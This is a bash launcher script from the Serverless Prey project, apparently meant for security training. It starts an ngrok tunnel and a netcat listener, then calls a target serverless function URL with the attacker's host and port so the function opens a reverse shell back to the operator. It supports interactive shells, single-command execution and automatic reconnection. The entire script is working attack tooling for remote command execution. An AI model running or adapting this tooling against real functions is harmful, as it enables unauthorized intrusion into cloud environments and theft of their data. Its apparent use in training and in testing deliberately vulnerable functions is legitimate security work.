#!/bin/bash

echo "
  @@@@@@@@((.                                                        ((@@@@@@@@
   *@@@@@@(/*#@%,                                               %&@(*/(@@@@@@/
     (@@@@@(*.#%&@*/(                                       //*@&%#.*(@@@@@(
       /@@@@@(***//(&&&%.                               .%&&&(//***(@@@@@%
          #&@@@@@@&&&&&&&&&                           %&&&&&&&&@@@@@@&#

                                 Serverless Prey
                 https://github.com/pumasecurity/serverless-prey
"

# Enable job control.
set -m

TMP_SUBDIR="/tmp/$(uuidgen)"
mkdir "$TMP_SUBDIR"

CURL_OUTPUT_FILE="$TMP_SUBDIR/curl_output.txt"

cleanup() {
    rm -r "$TMP_SUBDIR"
    pkill -P $$ & wait 2>/dev/null
}

# Kill all subprocesses and clean up files on exit.
trap 'cleanup' EXIT

MODE=$1
shift

# Read named arguments (https://stackoverflow.com/a/14203146)
while [[ "$#" -gt 0 ]]; do
    key="$1"
    shift
    value="$1"

    if [[ -z "$value" ]]; then
        echo "Error: Missing value for flag $key" >&2
        exit 1
    fi

    case $key in
    -u | --url)
        URL="$value"
        shift
        ;;

    -a | --api-key)
        API_KEY="$value"
        shift
        ;;

    -p | --port)
        LISTENER_PORT="$value"
        shift
        ;;

    -c | --command)
        COMMAND="$value"
        shift
        ;;

    -l | --loop)
        LOOP="$value"
        shift
        ;;

    -n | --no-ngrok)
        NO_NGROK="$value"
        shift
        ;;

    -d | --debug)
        DEBUG="$value"
        shift
        ;;

    -* | --*=) # unsupported flags
        echo "Error: Unsupported flag $key" >&2
        exit 1
        ;;

    *)
        shift
        ;;
    esac
done

LISTENER_PORT="${LISTENER_PORT:-4444}"

if [[ -z "$URL" ]]; then
    echo "usage: cheetah/cougar/panther [--url/-u FUNCTION_URL] [--api-key/-a API_KEY] [--port/-p LISTENER_PORT_DEFAULT_4444] [--command/-c SINGLE_COMMAND_TO_RUN_ON_CONNECT] [--loop/-l TRUE_TO_RECONNECT_ON_TIMEOUT]"
    echo "See script/USAGE.md for more details."
    exit 1
fi

if [[ -z "$NO_NGROK" ]]; then
    NGROK_LOG_FILE="$TMP_SUBDIR/ngrok_output.json"
    touch "$NGROK_LOG_FILE"

    # Run ngrok and derive the public-facing host and port it is using.
    ngrok tcp "$LISTENER_PORT" --log stdout --log-format json >"$NGROK_LOG_FILE" &
    sleep 3

    if ! [[ -n $(pgrep ngrok) ]]; then
        echo "Error: ngrok failed to start properly."

        if ! [[ -z "$DEBUG" ]]; then
            cat "$NGROK_LOG_FILE"
        fi

        exit 1
    fi

    NGROK_HOST_AND_PORT=$(cat "$NGROK_LOG_FILE" | jq -r 'select(.msg == "started tunnel").url' | awk 'BEGIN { FS="tcp://" }; { print $2 }')
    NGROK_HOST=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $1 }')
    NGROK_PORT=$(echo $NGROK_HOST_AND_PORT | awk 'BEGIN { FS=":" }; { print $2 }')

    if [[ -z $NGROK_HOST || -z $NGROK_PORT ]]; then
        echo "Error: Failed to get host or port from ngrok. Host: $NGROK_HOST_AND_PORT"

        if ! [[ -z "$DEBUG" ]]; then
            cat "$NGROK_LOG_FILE"
        fi

        exit 1
    fi

    TARGET_HOST="$NGROK_HOST"
    TARGET_PORT="$NGROK_PORT"
else
    TARGET_HOST="$(curl -s ipinfo.io/ip)"
    TARGET_PORT="$LISTENER_PORT"
fi

case $MODE in
cheetah)
    HEADER="X-API-Key: $API_KEY"
    URL="$URL?host=$TARGET_HOST&port=$TARGET_PORT"
    ;;

cougar)
    HEADER=""
    URL="$URL?host=$TARGET_HOST&port=$TARGET_PORT&code=$API_KEY"
    ;;

panther)
    HEADER="X-API-Key: $API_KEY"
    URL="$URL?host=$TARGET_HOST&port=$TARGET_PORT"
    ;;
esac

while ! [[ -z "$LOOP" ]] || [[ $NC_JOB == "" ]]; do
    if [[ -z "$COMMAND" ]]; then
        nc -l "$LISTENER_PORT" &
        NC_JOB=$(jobs | wc -l)
    else
        mkfifo "$TMP_SUBDIR/fifo"
        tail -f "$TMP_SUBDIR/fifo" | nc -l "$LISTENER_PORT" >"$TMP_SUBDIR/command_output.txt" &
    fi

    # Invoke the function with an HTTP call, connecting the reverse shell to the Netcat listener.
    curl -s -H "$HEADER" "$URL" >"$CURL_OUTPUT_FILE" &

    # Note: This might be an insufficient amount of time to wait for functions with cold starts.
    # TODO: Investigate better error checking methods.
    sleep 1

    # Exit if the curl request terminated already.
    if [[ -s "$CURL_OUTPUT_FILE" ]]; then
        echo "Error: curl command prematurely terminated."

        if ! [[ -z "$DEBUG" ]]; then
            cat "$CURL_OUTPUT_FILE"
        fi

        exit 1
    fi

    # Exit if the curl command failed altogether.
    if ! [[ -n $(pgrep curl) ]]; then
        echo "Error: curl command failed."

        if ! [[ -z "$DEBUG" ]]; then
            cat "$CURL_OUTPUT_FILE"
        fi

        exit 1
    fi

    if [[ -z "$COMMAND" ]]; then
        # Bring the Netcat listener back to the foreground.
        printf '> '
        fg $NC_JOB >/dev/null

        # Break out of the loop on CTRL-C.
        test $? -gt 128 && break
    else
        # Execute a single command and exit.
        echo "$COMMAND" >"$TMP_SUBDIR/fifo"
        sleep 1
        cat "$TMP_SUBDIR/command_output.txt"
        break
    fi

    echo
    echo "Connection terminated."

    if ! [[ -z "$LOOP" ]]; then
        rm "$CURL_OUTPUT_FILE"
        echo "Restarting..."
    fi
done
